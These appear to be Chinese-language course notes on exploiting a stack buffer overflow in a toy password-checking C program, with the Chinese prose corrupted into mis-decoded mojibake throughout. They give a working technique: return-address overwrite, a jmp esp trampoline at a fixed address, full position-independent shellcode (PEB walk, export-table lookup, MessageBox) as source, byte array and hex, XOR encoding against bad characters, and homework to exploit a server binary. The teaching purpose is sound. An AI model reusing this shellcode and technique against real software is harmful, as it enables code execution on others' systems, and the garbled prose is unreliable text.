æœ‰ä¸‹é¢ä¸€ä¸ªç¨‹åº

```c++
int main(void)
{
    char Password[]="crtest";
    char cPas[20]={20 *0};
    int iResult;
    FILE* pFile = NULL;
    pFile = fopen("pd.txt", "r");

    fscanf(pFile, "%s",cPas);
    iResult=strcmp(Password, cPas);
    if(iResult == 0)
    {
        printf("Welcom\r\n");
    }
    else
    {
        printf("fail\r\n");
    }

    //system("pause");
	  
    fclose(pFile);
    return 0;
}
```

æˆ‘ä»¬éœ€è¦æŠŠè‡ªå·±çš„ä»£ç æ³¨å…¥åˆ°è¯¥ç¨‹åºçš„è¿›ç¨‹,è®©ä»–å¼¹å‡ºä¸€ä¸ª Messagebox,ä¸èƒ½ç”¨ä¹‹å‰å­¦è¿‡çš„æ–¹æ³•,å¦‚è¿œç¨‹çº¿ç¨‹æ³¨å…¥,dllæ³¨å…¥,è·¨è¿›ç¨‹å†™å†…å­˜ç­‰æš´åŠ›çš„æ–¹æ³•,æˆ‘ä»¬çš„è¦æ±‚æ˜¯ä¸æ”¹åŠ¨è¯¥ç¨‹åºçš„è¿›ç¨‹å’Œå¯æ‰§è¡Œæ–‡ä»¶æ¥å®ç°



æ€è·¯:

æˆ‘ä»¬è¦æƒ³è¯¥è¿›ç¨‹å¼¹ä¸€ä¸ª MessageBox æˆ–è€…è¯´æŠŠ MessageBox  çš„ä»£ç æ³¨è¿›å» ,é¦–å…ˆç¬¬ä¸€æ­¥å°±æ˜¯ä»£ç å°±èƒ½å¤Ÿè¿›å…¥åˆ°exeå…¶ä¸­çš„è¿›ç¨‹é‡Œé¢

æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°è¯¥ç¨‹åº è¯»æ–‡ä»¶ç”¨çš„æ˜¯  %s  ,æ„å‘³ç€å®ƒçš„é•¿åº¦æ²¡æœ‰åšé™åˆ¶,é‚£æˆ‘ä»¬å¯ä»¥åœ¨ä»–è¯»æ–‡ä»¶çš„æ—¶å€™,è®©ä»–æŠŠæˆ‘ä»¬çš„ä»£ç è¯»è¿›æ–‡ä»¶

####  1.ä»£ç è¯»è¿›è¿›ç¨‹

ç°åœ¨è¯»å–çš„txt æ–‡æœ¬é‡Œé¢å¡«å…… nop,çœ‹çœ‹æ˜¯å¦å¯ä»¥è¯»è¿›å»

![img](notesimg/1659349193043-5e318425-0fd1-4562-a68f-2f95428ca05c.png)

ç”¨odæ‰“å¼€ç¨‹åº

![img](notesimg/1659349969226-113468a2-a8b3-4d6f-926e-62bde4afa014.png)

![img](notesimg/1659350056814-8f2c7bf8-41e6-4a73-9593-1c63a1ef5c62.png)

å¯ä»¥çœ‹åˆ°æ•°æ®å¯ä»¥è¯»è¿›æ¥äº†

![img](notesimg/1659350344249-7cb7fced-0af6-4021-8861-3fe99bdc2c90.png)

å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠä»£ç æ”¾åˆ°æ–‡ä»¶å°±å¯ä»¥è®©ä»–è¯»è¿›è¿›ç¨‹äº†

é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è®©ä»£ç è·‘èµ·æ¥äº†

#### 2.è¿è¡Œä»£ç 

æ€ä¹ˆè®©ä»£ç è·‘èµ·æ¥å‘¢,ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°,æ•°æ®æ˜¯è¯»åˆ°æ ˆé‡Œé¢å»äº†,ç°åœ¨æˆ‘éœ€è¦æŠŠæµç¨‹ä»ä»£ç åŒºè½¬åˆ°æ ˆä¸Šé¢å»

![img](notesimg/1659350683962-5eaffaf2-c67a-49ad-a42e-7850b093c1c9.png)

è·Ÿæµç¨‹è½¬ç§»ç›¸å…³çš„åœ°æ–¹å°±æ˜¯å‡½æ•°æ‰§è¡Œå®Œ   retn è¿”å›,å°±æ˜¯ä»æ ˆä¸Šå–åœ°å€æ‰§è¡Œä»£ç 

![img](notesimg/1659350882937-ba0fa442-fff8-49c6-aed5-5ad407fdeb96.png)

å› ä¸º%s æ²¡æœ‰é•¿åº¦é™åˆ¶ ,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ æ‰©å……æ•°æ®é•¿åº¦,åˆ° 0019ff34 (æ–‡ä»¶å†…å®¹å¼€å§‹åç§» 0x 24çš„ä½ç½®) å»ä¿®æ”¹ä»–çš„è¿”å›åœ°å€,è¿™æ ·è¿™ä¸ªåœ°å€å¡«å•¥,eip å°±ä¼šè·‘åˆ° æˆ‘ä»¬å¡«çš„åœ°å€å»æ‰§è¡Œä»£ç ,(è™½ç„¶ä¼šç ´åæ ˆå¸§ç»“æ„,ä¸è¿‡ä¸æ˜¯æˆ‘ä»¬å…³å¿ƒçš„é—®é¢˜)

![img](notesimg/1659351223672-b4295ab2-1a86-462f-98da-abf6d566a55e.png)

æˆåŠŸä¿®æ”¹äº†è¿”å›åœ°å€

![img](notesimg/1659351344831-e08fe54c-8559-4d1e-9266-034960eb8185.png)

åœ¨ retn  ä¸‹æ–­ç‚¹ ,f7 ,å¯ä»¥çœ‹åˆ° æˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„é¢„æœŸçš„ä»£ç 

![img](notesimg/1659351447405-5a1cea27-0829-4c2c-8b82-1f9043bcb90a.png)

#### è·³æ¿   **FF E4**

,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è¿”å›åœ°å€åé¢æ¥ç€å†™æˆ‘ä»¬çš„ MessageBox çš„ä»£ç äº† ,ä½†æ˜¯  0019ff38 æ¯•ç«Ÿæ˜¯ä¸€ä¸ªæ ˆåŸºå€,æå…¶ä¸ç¨³å®š,å› æ­¤æˆ‘ä»¬éœ€è¦è€ƒè™‘æ€ä¹ˆé€‰ä¸€ä¸ªç›¸å¯¹ç¨³å®šçš„åœ°å€,åˆå› ä¸ºæˆ‘çš„çš„ä»£ç åˆåœ¨æ ˆä¸Š,å› æ­¤è¦æ‰¾ä¸€ä¸ªå¯ä»¥è·³åˆ°æ ˆä¸Šçš„åœ°å€

,ä¾‹å¦‚æœ‰ä¸€æ¡æŒ‡ä»¤ä»£ç å¯ä»¥ç›´æ¥è·³åˆ°æ ˆä¸Š,æˆ‘ä»¬è¿™æ¡æŒ‡ä»¤ä¸ºè·³æ¿

æœ€ç»å…¸çš„è·³æ¿æŒ‡ä»¤ æ˜¯  jmp esp (æœºå™¨ç : **FF E4**) 

ç›¸åŒçš„è¿˜æœ‰ :   

call  esp               jmp   eax(eaxæ˜¯æ ˆåœ°å€)

æ­£å¸¸çš„ç¼–è¯‘å™¨æ˜¯ä¸ä¼šç”Ÿæˆä¸Šé¢æŒ‡ä»¤çš„,å› æ­¤æˆ‘ä»¬å¯ä»¥  ä¸æœ jmp  esp æŒ‡ä»¤è€Œæœå¥¹å¯¹åº”çš„æœºå™¨ç     FFE4  å°±å¯ä»¥äº†

![img](notesimg/1659354249525-faff960c-9657-4bc2-8477-4e1c8c01737d.png)

å¦‚æœåœ¨è¯¥æ¨¡å—æ‰¾ä¸åˆ°,å¯ä»¥åˆ°ç³»ç»Ÿapiå»æ‰¾,ç›´æ¥åœ¨è¿›ç¨‹ä¸­å»æ‰¾

![img](notesimg/1659354665207-401d2329-5a27-41e7-8115-454c80324737.png)

win10æœ‰ä¸€ä¸ªé€šç”¨è·³æ¿,å°±æ˜¯æ•´ä¸ªç³»ç»Ÿç‰ˆæœ¬éƒ½å¯ä»¥ç”¨,ä½†æ˜¯ä¸è·¨ç³»ç»Ÿç‰ˆæœ¬, å³ win7 è·Ÿ win10æ˜¯ä¸ä¸€æ ·çš„

win10çš„é€šç”¨è·³æ¿åœ°å€æ˜¯     **0x7FFA4512**

![img](notesimg/1659354924610-0c795719-6f92-4fd8-bdcc-651948a7dfc2.png)



æŠŠè¿”å›åœ°å€æ”¹åˆ°é€šç”¨è·³æ¿å†çœ‹ä¸€ä¸‹

![img](notesimg/1659355231401-376e93b8-2994-40a5-8210-80f0b2377bf8.png)

å†è¿è¡Œå‘ç°å¯ä»¥è¿è¡Œä»£ç äº†

![img](notesimg/1659355376572-d790bcc9-6ce7-43dc-86c5-1d6fcf479c76.png)

![img](notesimg/1659355307625-d810f048-e126-47f2-9df4-3bf5be1e6dc3.png)

#### è¿è¡ŒMessageBox

è¦è¿è¡ŒMessageBox éœ€è¦ä¸€ä¸ªå¯¹åº”çš„ shellcode

ShellCode.h

```c++
#pragma once
#include<windows.h>

#include <compressapi.h>
#pragma comment(lib, "Cabinet.lib")


typedef  FARPROC(WINAPI* PFN_GetProcAddress)(
    _In_ HMODULE hModule,
    _In_ LPCSTR lpProcName
);

typedef  FARPROC(WINAPI* PFN_LoadLibraryA)(
    _In_ LPCSTR lpLibFileName
);

typedef  BOOL(WINAPI* PFN_CreateDecompressor)(
    DWORD   Algorithm,
    PCOMPRESS_ALLOCATION_ROUTINES AllocationRoutines,
    PDECOMPRESSOR_HANDLE   DecompressorHandle
 );


typedef  BOOL(WINAPI* PFN_Decompress)(
    DECOMPRESSOR_HANDLE DecompressorHandle,
    LPCVOID             CompressedData,
    SIZE_T              CompressedDataSize,
    PVOID               UncompressedBuffer,
    SIZE_T              UncompressedBufferSize,
    PSIZE_T             UncompressedDataSize
 );


typedef  LPCVOID(WINAPI* PFN_VirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef  BOOL(WINAPI* PFN_VirtualProtect)(
    _In_  LPVOID lpAddress,
    _In_  SIZE_T dwSize,
    _In_  DWORD flNewProtect,
    _Out_ PDWORD lpflOldProtect
    );

typedef int (WINAPI* PFN_MessageBoxA)
(
    _In_opt_ HWND hWnd,
    _In_opt_ LPCSTR lpText,
    _In_opt_ LPCSTR lpCaption,
    _In_ UINT uType
    );


struct  EnvironMent 
{
    PFN_GetProcAddress      pfnGetProcAddress;
    PFN_LoadLibraryA    pfnLoadLibraryA;
    PFN_CreateDecompressor   pfnCreateDecompressor;
    PFN_Decompress      pfnDecompress;
    PFN_VirtualAlloc    pfnVirtualAlloc;
    PFN_VirtualProtect  pfnVirtualProtect;
    PFN_MessageBoxA     pfnMessageBoxA;
};

void initEnvironment(EnvironMent* pEnv);
HMODULE GetKernel32();
HMODULE GetModuleBase();
void* MyGetProcAddress(HMODULE hMod, LPCSTR lpFunName);
```

ShellCode.cpp

```c++

#include "ShellCode.h"
#include <memory.h>


void Entry() {

    EnvironMent env;
    initEnvironment(&env);
    char szHelloShellcode[] = { 'H','e','l','l','o','S','h','e','l','l','c','o','d','e','\0' };
    env.pfnMessageBoxA(NULL, szHelloShellcode, NULL, MB_OK);
}


void initEnvironment(EnvironMent* pEnv)
{

    //è·å– Kernel32 çš„åœ°å€
    HMODULE hKer = GetKernel32();

    //è·å– GetProcAddress åœ°å€
    char szGetProcAddress[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s','\0' };
    pEnv->pfnGetProcAddress = (PFN_GetProcAddress)MyGetProcAddress(hKer, szGetProcAddress);

    //è·å–LoadLibraryåœ°å€
    char szLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
    pEnv->pfnLoadLibraryA = (PFN_LoadLibraryA)pEnv->pfnGetProcAddress(hKer, szLoadLibrary);

    //è·å– user32.lib åœ°å€
    char szUser32[] = { 'u','s','e','r','3','2','\0' };
    HMODULE hUser32 = (HMODULE)pEnv->pfnLoadLibraryA(szUser32);
    
    //è·å– MessageBoxA åœ°å€
    char szMessageBoxA[] = { 'M','e','s','s','a','g','e','B','o','x','A','\0' };
    pEnv->pfnMessageBoxA = (PFN_MessageBoxA)pEnv->pfnGetProcAddress(hUser32, szMessageBoxA);
    
}


//è·å–Kernel32åœ°å€
HMODULE GetKernel32()
{
    HMODULE hKer = NULL;
    __asm
    {
        mov     eax, dword ptr fs : [0x30]
        mov     eax, dword ptr[eax + 0x0C]
        mov     eax, dword ptr[eax + 0x0C]
        mov     eax, dword ptr[eax]
        mov     eax, dword ptr[eax]
        mov     eax, dword ptr[eax + 0x18]
        mov hKer, eax
    }
    return hKer;
}
//è·å–æ¨¡å—åŸºå€
HMODULE GetModuleBase()
{
    HMODULE hMod = NULL;
    __asm
    {
        mov     eax, dword ptr fs : [0x30]
        mov     eax, dword ptr[eax + 0x0C]
        mov     eax, dword ptr[eax + 0x0C]
        mov     eax, dword ptr[eax + 0x18]
        mov hMod, eax
    }
    return hMod;
}

void* MyGetProcAddress(HMODULE hMod, LPCSTR lpFunName)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;                        //DOSå¤´
    PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)hMod + pDosHeader->e_lfanew);      //NTå¤´
    PIMAGE_DATA_DIRECTORY pExportDirectory = &pNtHeader->OptionalHeader.DataDirectory[0];        //å¯¼å‡ºè¡¨æ•°æ®ç›®å½•
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hMod + pExportDirectory->VirtualAddress);
    if ((DWORD)lpFunName > 0xffff)
    {
        //æŒ‰ç…§åç§°æŸ¥æ‰¾
        for (DWORD i = 0; i < pExport->NumberOfNames; i++)
        {
            char* pName = (char*)(*(DWORD*)((DWORD)hMod + pExport->AddressOfNames + i * 4) + (DWORD)hMod);
            if (strcmp(lpFunName, pName) == 0)
            {
                DWORD dwOrdinals = *(WORD*)((DWORD)hMod + pExport->AddressOfNameOrdinals + i * 2);
                return (void*)(*(DWORD*)((DWORD)hMod + pExport->AddressOfFunctions + dwOrdinals * 4) + (DWORD)hMod);
            }
        }
        return 0;
    }
    else
    {
        //æŒ‰ç…§åºå·æŸ¥æ‰¾
        DWORD dwOrdinals = (DWORD)lpFunName - pExport->Base;
        if (dwOrdinals >= pExport->NumberOfFunctions)
        {
            return 0;
        }
        return (void*)(*(DWORD*)((DWORD)hMod + pExport->AddressOfFunctions + dwOrdinals * 4) + (DWORD)hMod);
    }
    return 0;
}
```

Cæºç 

```c++
unsigned AnsiChar data[392] = {
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x2C, 0x8D, 0x4D, 0xD4, 0xE8, 0x32, 0x00, 0x00, 0x00, 0x6A, 0x00, 
	0x6A, 0x00, 0x8D, 0x45, 0xF0, 0xC7, 0x45, 0xF0, 0x48, 0x65, 0x6C, 0x6C, 0x50, 0x6A, 0x00, 0xC7, 
	0x45, 0xF4, 0x6F, 0x53, 0x68, 0x65, 0xC7, 0x45, 0xF8, 0x6C, 0x6C, 0x63, 0x6F, 0x66, 0xC7, 0x45, 
	0xFC, 0x64, 0x65, 0xC6, 0x45, 0xFE, 0x00, 0xFF, 0x55, 0xEC, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC, 0xCC, 
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x44, 0x53, 0x56, 0x57, 0x89, 0x4D, 0xF0, 0xC7, 0x45, 0xFC, 0x00, 
	0x00, 0x00, 0x00, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x0C, 0x8B, 
	0x00, 0x8B, 0x00, 0x8B, 0x40, 0x18, 0x89, 0x45, 0xFC, 0x8B, 0x5D, 0xFC, 0x8D, 0x4D, 0xBC, 0xC7, 
	0x45, 0xBC, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xC0, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xC4, 
	0x64, 0x64, 0x72, 0x65, 0x8B, 0x43, 0x3C, 0x66, 0xC7, 0x45, 0xC8, 0x73, 0x73, 0xC6, 0x45, 0xCA, 
	0x00, 0x8B, 0x44, 0x18, 0x78, 0x03, 0xC3, 0x89, 0x45, 0xF4, 0x81, 0xF9, 0xFF, 0xFF, 0x00, 0x00, 
	0x76, 0x66, 0x8B, 0x48, 0x18, 0x33, 0xFF, 0x89, 0x4D, 0xF8, 0x85, 0xC9, 0x74, 0x44, 0x8B, 0x70, 
	0x20, 0x03, 0xF3, 0x8B, 0x06, 0x8D, 0x4D, 0xBC, 0x03, 0xC3, 0x8D, 0x9B, 0x00, 0x00, 0x00, 0x00, 
	0x8A, 0x11, 0x3A, 0x10, 0x75, 0x1A, 0x84, 0xD2, 0x74, 0x12, 0x8A, 0x51, 0x01, 0x3A, 0x50, 0x01, 
	0x75, 0x0E, 0x83, 0xC1, 0x02, 0x83, 0xC0, 0x02, 0x84, 0xD2, 0x75, 0xE4, 0x33, 0xC0, 0xEB, 0x05, 
	0x1B, 0xC0, 0x83, 0xC8, 0x01, 0x85, 0xC0, 0x74, 0x0D, 0x47, 0x83, 0xC6, 0x04, 0x3B, 0x7D, 0xF8, 
	0x72, 0xC1, 0x33, 0xC0, 0xEB, 0x28, 0x8B, 0x55, 0xF4, 0x8B, 0x42, 0x24, 0x8D, 0x04, 0x78, 0x0F, 
	0xB7, 0x0C, 0x18, 0x8B, 0x42, 0x1C, 0xEB, 0x0E, 0x8D, 0x4D, 0xBC, 0x2B, 0x48, 0x10, 0x3B, 0x48, 
	0x14, 0x73, 0xDF, 0x8B, 0x40, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x18, 0x03, 0xC3, 0x8B, 0x75, 
	0xF0, 0x8D, 0x4D, 0xCC, 0x51, 0x53, 0xC7, 0x45, 0xCC, 0x4C, 0x6F, 0x61, 0x64, 0x89, 0x06, 0xC7, 
	0x45, 0xD0, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD4, 0x61, 0x72, 0x79, 0x41, 0xC6, 0x45, 0xD8, 
	0x00, 0xFF, 0xD0, 0x8D, 0x4D, 0xE8, 0x89, 0x46, 0x04, 0x51, 0xC7, 0x45, 0xE8, 0x75, 0x73, 0x65, 
	0x72, 0x66, 0xC7, 0x45, 0xEC, 0x33, 0x32, 0xC6, 0x45, 0xEE, 0x00, 0xFF, 0xD0, 0x8D, 0x4D, 0xDC, 
	0xC7, 0x45, 0xDC, 0x4D, 0x65, 0x73, 0x73, 0x51, 0x50, 0x8B, 0x06, 0xC7, 0x45, 0xE0, 0x61, 0x67, 
	0x65, 0x42, 0xC7, 0x45, 0xE4, 0x6F, 0x78, 0x41, 0x00, 0xFF, 0xD0, 0x5F, 0x89, 0x46, 0x18, 0x5E, 
	0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x00, 0x00, 0x00
};
```

16è¿›åˆ¶

```
558BEC83EC2C8D4DD4E8320000006A006A008D45F0C745F048656C6C506A00C745F46F536865C745F86C6C636F66C745FC6465C645FE00FF55EC8BE55DC3CCCC558BEC83EC44535657894DF0C745FC0000000064A1300000008B400C8B400C8B008B008B40188945FC8B5DFC8D4DBCC745BC47657450C745C0726F6341C745C4646472658B433C66C745C87373C645CA008B44187803C38945F481F9FFFF000076668B481833FF894DF885C974448B702003F38B068D4DBC03C38D9B000000008A113A10751A84D274128A51013A5001750E83C10283C00284D275E433C0EB051BC083C80185C0740D4783C6043B7DF872C133C0EB288B55F48B42248D04780FB70C188B421CEB0E8D4DBC2B48103B481473DF8B401C8D04888B041803C38B75F08D4DCC5153C745CC4C6F61648906C745D04C696272C745D461727941C645D800FFD08D4DE889460451C745E87573657266C745EC3332C645EE00FFD08D4DDCC745DC4D65737351508B06C745E061676542C745E46F784100FFD05F8946185E5B8BE55DC3000000
```

æŠŠå¯¹åº”çš„ 16è¿›åˆ¶å€¼æ‹·è´åˆ° æ–‡æœ¬

![image.png](notesimg/1659359236323-ccc54204-d417-4f5a-96e9-3442d8796e59.png)



æˆ‘ä»¬è¿è¡Œå‘ç°å´©äº†,ç”¨odå»è¿›è¡Œè°ƒè¯•

![image.png](notesimg/1659359506621-77abcb21-1bb6-42f2-8b8b-bca2f4e32ed9.png)



å‘ç°æ•°æ®æ²¡æœ‰å…¨éƒ¨è¯»è¿›æ¥,ä»ä¸­é—´æˆªæ–­äº†,å› ä¸º %s è¯»æ•°æ®,ç¢°åˆ°æŸäº›å­—ç¬¦ä¼šè¢«æˆªæ–­,è¿™äº›å­—ç¬¦æˆ‘ä»¬ç§°ä¸ºåå­—ç¬¦(bad  char)

é‚£ä¸Šé¢é—®é¢˜å¤„ç†æ–¹æ³•å°±æ˜¯  : å¯¹å†…å®¹å…ˆåšå¤„ç†,ä½¿å…¶æ²¡æœ‰æˆªæ–­çš„å­—ç¬¦,åé¢å†è¿˜åŸ,å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¼‚æˆ–å€¼,æ¯ä¸ªå­—ç¬¦å¼‚æˆ–ä¹‹åæ²¡æœ‰åå­—ç¬¦,è¯»è¿›å»ä¹‹ååœ¨å¼‚æˆ–å›æ¥  

[ğŸ“æ±‚å¼‚æˆ–å€¼å·¥å…·.zip](./æ±‚å¼‚æˆ–å€¼å·¥å…·.zip)



![img](https://cdn.nlark.com/yuque/0/2022/png/27242010/1659360720021-be2778d3-91a8-453a-b3f1-6715aa78ae3b.png)

![image.png](notesimg/1659360720021-be2778d3-91a8-453a-b3f1-6715aa78ae3b.png)

åå­—ç¬¦



![image.png](notesimg/1659360753796-727375f5-ce7e-4e05-b401-9b0fe62ee76f.png)

shellcode æœºå™¨ç 

![image.png](notesimg/1659360682128-d83562b4-bc0b-4fa5-9793-6c7162f9c066.png)



æ±‚å¾—å¼‚æˆ–ä¹‹ååšå¤„ç†

![image.png](notesimg/1659361147168-9a4fabcc-9a77-47af-8f9c-003f2c6515d8.png)



å¾—åˆ°æ–°çš„æ•°æ®

![image.png](notesimg/1659361192447-10c9e402-92b1-4e31-a320-13572559fc0e.png)



æˆ‘ä»¬æŠŠä»£ç åŠ åˆ°æ–‡æœ¬ï¼Œç°åœ¨çœ‹çœ‹èƒ½å¦éƒ½è¿›å»

![image.png](notesimg/1659361514539-b2c4c592-6c03-46a0-b159-40fec0a27282.png)



è¿è¡Œå‘ç°è¯»æ–‡ä»¶æ˜¯å´©äº†ï¼Œé€šè¿‡x64å–è°ƒè¯•

![image.png](notesimg/1659361820068-1ebc04d9-3105-45ee-a76c-1b075cbe8b56.png)



å¯ä»¥å‘ç° 1A0000å·²ç»ä¸æ˜¯æ ˆç©ºé—´äº†

![image.png](notesimg/1659361900693-df6a2db8-6f1c-4967-b870-fea5acdfc611.png)



å› æ­¤è¯´æ˜ï¼Œ 0x7FFA4512   è¿™ä¸ªåœ°å€åè¯»å–çš„æ•°æ®ä¸èƒ½è¾¾åˆ° 1A0000ï¼Œå³åé¢åªèƒ½è¯» F4ä¸ªå­—èŠ‚ï¼Œè¿œä½äºæˆ‘ä»¬è¦è¯»çš„å­—èŠ‚

å¤„ç†æ–¹æ³•å¯ç§»ç”³è¯·ç©ºé—´ï¼ˆæ¯”è¾ƒéº»çƒ¦ï¼‰æˆ–è€…è·³åˆ°ä¸Šé¢å»è¯»æ–‡ä»¶ï¼Œå†è§£ç 

![image.png](notesimg/1659363541777-2c5c1675-f7f5-415e-9a72-969c2e7d7604.png)





![image.png](notesimg/1659363313763-d1851fa6-ac5e-4a0f-a4e2-b7f7353999dc.png)



![image.png](notesimg/1659363394837-02818f7b-a79a-420b-9e02-815edc5b29a0.png)



![image.png](notesimg/1659363367070-55817d1a-cfbb-43b0-895e-d9c20146a00b.png)



è¿è¡Œå‘ç°è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œç»§ç»­è°ƒè¯•  å‘ç°åœ¨å¹³æ ˆæ—¶å€™äº§ç”Ÿäº†æˆªæ–­

![image.png](notesimg/1659364185500-b6598477-87ac-475a-ac38-a4ccd65fdcfa.png)





![image.png](notesimg/1659364031098-cb14e875-90ed-4a32-b681-3038ea63635e.png)



å› æ­¤å»æ‰å¹³æ ˆ

![image.png](notesimg/1659364223722-077dbf5c-2132-459b-b293-87b00338783a.png)



ç»§ç»­è¿è¡Œå‘ç°è¿˜æ˜¯å´©äº†ï¼Œç»§ç»­è°ƒè¯•

å¯¹æ¯”ä¸€ä¸‹å¼‚æˆ–åçš„å€¼ï¼Œå‘ç°ç¬¬ä¸€ä¸ªå­—ç¬¦æ²¡æœ‰è¿˜åŸï¼Œå¯ä»¥çŸ¥é“å¼‚æˆ–æ˜¯å–å¾—ä¸‹æ ‡ç´¢å¼•å‡ºé”™äº†ï¼Œä¿®æ”¹ä¸€ä¸‹



![image.png](notesimg/1659365457563-9706b621-c54a-44cc-991a-5657eb193b52.png)



ä¿®æ”¹ä¸€ä¸‹ç´¢å¼•

![image.png](notesimg/1659364878873-294109c7-8ddc-4819-963b-8ab07075e545.png)





![image.png](notesimg/1659364935905-cb4f66cd-a266-4a8c-9462-7f52bdfaca2e.png)



å†è¿è¡Œï¼Œå‘ç°å¯ä»¥æˆåŠŸå¼¹å‡ºæ¥äº†

![image.png](notesimg/1659365056050-c1ed277e-1222-4641-95ff-89c5f55c4a19.png)





 æµç¨‹è½¬ç§» 

å¦‚ä½•æ‰§è¡Œæ ˆä¸Šçš„ä»£ç ï¼Ÿå°†ç¨‹åºçš„æµç¨‹è½¬ç§»åˆ°æ ˆä¸Šçš„ä»£ç è¿è¡Œã€‚

â—æ ˆä¸æµç¨‹è½¬ç§»ç›¸å…³æŒ‡ä»¤ï¼šret, å½“è¾“å…¥ç­‰å‡½æ•°çš„ç¼“å†²åŒºåœ¨æ ˆä¸Šï¼Œé‚£ä¹ˆå¦‚æœæ ˆæº¢å‡ºï¼Œå°†ä¼šè¦†ç›–æ‰æ ˆä¸Šä¿ç•™çš„å…¶ä»–å€¼ï¼Œå¯¼è‡´retçš„æ—¶å€™å‡ºé”™ï¼Œé‚£ä¹ˆæ˜¯å¦ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥è¿›è¡Œä»£ç çš„æ‰§è¡Œå‘¢ï¼Ÿ



â—é¦–å…ˆï¼Œæ ˆæº¢å‡ºï¼Œåˆ¤æ–­è¿”å›åœ°å€æ‰€å¤„çš„æ ˆä½ç½®ï¼Œæ ˆæº¢å‡ºè¦†ç›–å®ƒï¼Œé‚£ä¹ˆå½“æ‰§è¡Œretçš„æ—¶å€™ï¼Œå°±ä¼šè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€ã€‚æ­¤æ—¶æµç¨‹å°±é€šè¿‡retè½¬ç§»è¿‡æ¥äº†ã€‚



ä¸ºä½•ä¸ç›´æ¥å°†retçš„åœ°å€å¡«æ ˆåœ°å€ï¼Ÿ

â—ä¼—æ‰€å‘¨çŸ¥ï¼Œæ ˆæ˜¯ä¸€ä¸ªåŠå…¶ä¸ç¨³å®šçš„åœ°æ–¹ï¼Œéšæ—¶åœ¨å˜åŠ¨ï¼Œå¦‚æœæº¢å‡ºæ„é€ çš„æ—¶å€™æ‰€å¡«çš„åœ°å€æ˜¯æ ˆçš„åœ°å€ï¼Œå½“é‡å¯ç”µè„‘ï¼Œæˆ–è€…æ˜¯é‡å¯è½¯ä»¶ï¼Œé‚£ä¹ˆä¹‹å‰è¦†ç›–çš„åœ°å€å°±ä¸å†æ˜¯shellcodeçš„åœ°å€ã€‚

![image.png](notesimg/1638289206308-f6b72c55-d397-4e8f-ae67-82742fdec162.png)



 æ¼æ´çš„å…¬å¸ƒä¸ 0 day 

â—0 dayï¼šæœªè¢«å…¬å¸ƒã€æœªè¢«ä¿®å¤çš„æ¼æ´å¾€å¾€è¢«ç§°åš 0 dayã€‚

â—0 day æ¼æ´æ˜¯å±å®³æœ€å¤§çš„æ¼æ´ï¼Œå½“ç„¶å¯¹æ”»å‡»è€…æ¥è¯´ä¹Ÿæ˜¯æœ€æœ‰ä»·å€¼çš„æ¼æ´ã€‚å½“ 0 day æ¼æ´è¢«æ›å…‰ï¼Œé‚£æ„å‘³ç€å…¨ä¸–ç•Œçš„é»‘å®¢éƒ½çŸ¥é“è¿™ä¸ªæ¼æ´ï¼Œä¹Ÿæ‡‚å¾—æ€ä¹ˆå»åˆ©ç”¨å®ƒï¼Œåœ¨å‚å•†çš„å®˜æ–¹è¡¥ä¸å‘å¸ƒå‰ï¼Œæ•´ä¸ª Internet çš„ç½‘ç»œå°†å¤„äºé«˜å±é¢„è­¦çŠ¶æ€ã€‚ 0 day æ›å…‰å±äºä¸¥é‡çš„å®‰å…¨äº‹ä»¶ã€‚

â—1 dayï¼šåˆšå…¬å¼€çš„æ¼æ´

â—n dayï¼š å…¬å¼€äº†ä¸€æ®µæ—¶é—´çš„æ¼æ´



 ä½œä¸š 

 å®Œæˆåˆ©ç”¨aç¨‹åºçš„æ¼æ´å¼¹massageboxã€‚ 

è¯·å®Œæˆä»¥ä¸‹å·¥ä½œï¼š

 åˆ†æç ”ç©¶exploit_me_A.exeçš„åŠŸèƒ½

å®šä½å¹¶ç ”ç©¶exploit_me_A.exeä¸­çš„æ¼æ´

ç¼–å†™exploitæ”»å‡»ç¨‹åºï¼Œæ„é€ ç•¸å½¢æ•°æ®åŒ…ï¼Œä½¿exploit_me_A.exeæˆåŠŸæ‰§è¡Œshellcode

å®Œæˆåˆ†ææŠ¥å‘Š

æäº¤ææ–™åŒ…æ‹¬ï¼š

\1.       åˆ†ææŠ¥å‘Šã€‚

\2.       è°ƒè¯•é€šè¿‡çš„exploitæºä»£ç ï¼ˆshellcode + å‘é€shellcodeçš„ä»£ç ï¼‰

\3.       å¯æ‰§è¡Œçš„exploitç¨‹åº

ï¼ˆé¼“åŠ±ä½¿ç”¨Cè¯­è¨€ï¼‰

æç¤ºï¼š

exploit_me_A.exe æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ç¨‹åº

[ğŸ“exploit_me_A.exe.zip](./exploit_me_A.exe.zip)



åˆ†æ:



![image.png](notesimg/1659371712779-d408ca05-b135-4675-93bb-b6f1948a59a0.png)



